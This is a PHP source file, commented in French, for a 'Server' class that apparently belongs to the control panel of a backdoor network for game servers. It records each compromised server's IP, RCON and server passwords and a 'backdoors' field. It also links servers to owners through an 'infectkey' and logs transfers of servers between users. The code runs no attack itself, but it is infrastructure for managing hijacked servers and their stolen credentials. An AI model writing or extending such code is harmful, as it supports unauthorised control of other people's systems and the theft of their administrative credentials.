<?php
class Server
{
    const TABLE = 'servers';

	// Vérifie si un serveur existe
	static function ServerExist($id)
	{
		if($GLOBALS['DB']->Count(self::TABLE, ["id" => $id]) != 0)
		{
			return true;
		}
		else
		{
			return false;
		}
	}

    // Vérifie si un serveur existe par ip
    public static function ServerExistByIP($ip)
    {
        return $GLOBALS['DB']->Count(self::TABLE, ["ip" => $ip]) != 0;
    }

	// Récupére le server
	static function GetServer($server_id)
	{
        return $GLOBALS['DB']->GetContent(self::TABLE, ["id" => $server_id])[0];
	}

    // Récupére le server
    static function GetServerByIP($server_ip)
    {
        return $GLOBALS['DB']->GetContent(self::TABLE, ["ip" => $server_ip])[0];
    }

	// Récupére tous les serveur
	public static function getAll()
	{
		return $GLOBALS['DB']->GetContent(self::TABLE, [], 'ORDER BY used_slots DESC');
	}

	// Récupére tous les serveur d'un utilisateur
	public static function getAllFromUser($owner_id)
	{
        if ($owner_id == null)
        {
            $owner_id = $_SESSION['user']['id'];
        }

		return $GLOBALS['DB']->GetContent(self::TABLE, ["owner" => $owner_id], 'ORDER BY used_slots DESC');
	}

	// Récupére tous L'historiques d'un utilisateur
	public static function getAllOfflineFromUser($owner_id)
	{
        if ($owner_id == null)
        {
            $owner_id = $_SESSION['user']['id'];
        }
        
		return $GLOBALS['DB']->GetContent("servers", ["owner" => $owner_id], 'ORDER BY last_update DESC LIMIT 400');
	}

    // Récupére les chats du serveur
    static function GetServerChat($ip)
    {
        return $GLOBALS['DB']->GetContent("servers_chat", ['server_ip' => $ip]);
    }

    // Récupére l'owner du serveur
    static function GetServerOwner($user_id)
    {
        $user = tmpcache("servers-owner-{$user_id}", $GLOBALS['DB']->GetContent("users", ['id' => $user_id])[0], 300);
        if($user['ban'] == 1) {
            return '<span class="text-danger">'. htmlentities($user['username']) .'</span>';
        } elseif(time() >= ($user['last_login'] + 604800 * 3)) {
            return '<span class="text-orange">'. htmlentities($user['username']) .'</span>';
        } elseif($user['roles'] == 0) {
            return '<span class="text-pink">'. htmlentities($user['username']) .'</span>';
        } else {
            return htmlentities($user['username']);
        }
    }

    // Récupére les chats du serveur
    static function GiveServer($target, $server_id)
    {
    	global $AUTHUSER;

    	$targetname = $GLOBALS['DB']->GetContent("users", ['id' => $target])[0]['username'];
    	$serverip = $GLOBALS['DB']->GetContent("servers", ['id' => $server_id])[0]['ip'];

        $GLOBALS['DB']->Update("servers", ['id' => $server_id], ['owner' => $target]);

        Logs::AddLogs("L'utilisateur ".htmlentities($AUTHUSER['username'])." à donner le serveur $serverip à $targetname","info","fas fa-donate");
    }

    // Récupére le nombre total de Serveurs
    public static function countFromUser($owner_id = null)
    {
        if ($owner_id == null)
        {
            $owner_id = $_SESSION['user']['id'];
        }

        return tmpcache("servers-count-{$owner_id}", $GLOBALS['DB']->Count("servers", ['owner' => $owner_id]), 300);
    }

    // Récupére le nombre total de Serveurs
    public static function count()
    {
        return $GLOBALS['DB']->Count("servers");
    }

    // Récupére le nombre total de Serveurs allumer
    static function GetOnlineServerNumberFromUser($owner_id = null)
    {
        if ($owner_id == null)
        {
            $owner_id = $_SESSION['user']['id'];
        }

        $time = (time() - 130);

        return $GLOBALS['DB']->Count("servers", ['owner' => $owner_id], "AND last_update >= $time");
    }

    static function GetOwnerByKey($infectkey)
    {
        $value = tmpcache("key-{$infectkey}", $GLOBALS['DB']->GetContent("users", ['infectkey' => $infectkey]), 600);

        if(isset($value) && !empty($value)) {
            if ($value[0]["id"] !== NULL) {
                return $value[0]["id"];
            } else {
                return 1;
            }
        }
    }

    // insert le serveur
    static function InsertServer($hostname, $ip, $map, $gamemode, $maxplayer, $rcon, $password, $owner, $uptime, $time, $apiVersion, $backdoors = null)
    {
        if($backdoors == null) {
            $backdoors = "[]";
        }
        $GLOBALS['DB']->Insert(
            "servers", 
            [
                'ip' => $ip,
                'hostname' => $hostname,
                'map' => $map,
                'gamemode' => $gamemode,
                'max_slots' => $maxplayer,
                'rcon' => $rcon,
                'password' => $password,
                'owner' => $owner,
                'uptime' => $uptime,
                'last_update' => $time,
                'api_version' => $apiVersion,
                'backdoors' => $backdoors
            ]
        );
    }

    // Update le serveur
    static function UpdateServer($hostname, $ip, $map, $gamemode, $maxplayer, $rcon, $password, $owner, $uptime, $time, $apiVersion, $backdoors = null)
    {
        if($backdoors == null) {
            $backdoors = "[]";
        }

        $GLOBALS['DB']->Update(
            "servers", 
            [
                'ip' => $ip
            ], 
            [
                'hostname' => $hostname,
                'map' => $map,
                'gamemode' => $gamemode,
                'max_slots' => $maxplayer,
                'rcon' => $rcon,
                'password' => $password,
                'owner' => $owner,
                'uptime' => $uptime,
                'last_update' => $time,
                'api_version' => $apiVersion,
                'backdoors' => $backdoors
            ]
        );
    }

}